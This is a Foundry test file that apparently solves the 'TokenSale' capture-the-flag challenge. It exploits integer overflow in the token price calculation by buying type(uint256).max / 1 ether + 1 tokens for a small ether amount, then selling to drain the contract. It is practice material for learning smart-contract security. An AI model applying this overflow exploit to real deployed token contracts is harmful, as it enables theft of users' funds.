// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSale public tokenSale;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        tokenSale = (new TokenSale){value: 1 ether}();
        exploitContract = new ExploitContract(tokenSale);
        vm.deal(address(exploitContract), 4 ether);
    }

    // Use the instance of tokenSale and exploitContract
    function testIncrement() public {
        // Put your solution here
        exploitContract.buy{value: 415992086870360064}(type(uint256).max / 1 ether +1);
        console.log(tokenSale.balanceOf(address(exploitContract)));
        exploitContract.sell(1);
        console.log(address(exploitContract).balance);
        console.log(address(tokenSale).balance);
        console.log(tokenSale.balanceOf(address(exploitContract)));
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenSale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
